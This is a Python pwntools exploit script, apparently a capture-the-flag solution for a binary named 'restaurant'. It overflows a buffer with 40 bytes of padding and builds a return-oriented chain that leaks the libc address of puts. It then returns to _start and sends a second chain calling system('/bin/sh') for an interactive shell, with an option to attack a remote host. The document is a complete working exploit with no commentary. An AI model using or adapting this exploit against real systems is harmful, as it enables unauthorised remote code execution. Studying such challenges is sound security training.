#!/usr/bin/env python3
from pwn import *
import sys

elf = context.binary = ELF("./restaurant_patched", checksec=True)
libc = ELF("./libc.so.6")
#context.log_level = "debug"

#tmx
context.terminal = ["tmux", "splitw", "-h"]

def start(argv=[], *a, **kw):
    if args.R:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.GDB:
        return gdb.debug(elf.path, gdbscript=gdbscript, *a, **kw)
    else:
        return process(elf.path, *a, **kw)

gdbscript = """
continue
"""

r = start()
# ---------xploit------------

r.sendlineafter(b">", b"1")
# leak libc
pop_rdi = 0x4010a3 # 0x00000000004010a3: pop rdi; ret;
libc_puts = 0x601fa8  # 0000000000601fa8 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
puts = elf.plt.puts
_start = 0x4006e0 #  0x000026e0 0x004006e0 GLOBAL FUNC   43       _start
ret = 0x40063e  # 0x000000000040063e: ret; 
payload = [
        b"a"*40,
        pop_rdi,
        libc_puts,
        puts,
        _start
        ]

r.sendlineafter(b">", flat(payload))

r.recvuntil(b"aaaaaaa\xa3\x10@")
libc.address = u64(r.recv()[:6].ljust(8, b"\x00")) - libc.sym.puts
print("LIBC ADDRESS -> ", hex(libc.address))
bin_sh = next(libc.search(b"/bin/sh"))

r.sendline(b"1")
payload = [
        b"a"*40,
        ret,
        pop_rdi,
        bin_sh,
        p64(libc.sym.system)
        ]
r.sendline(flat(payload))
# --------interactive--------
r.interactive()
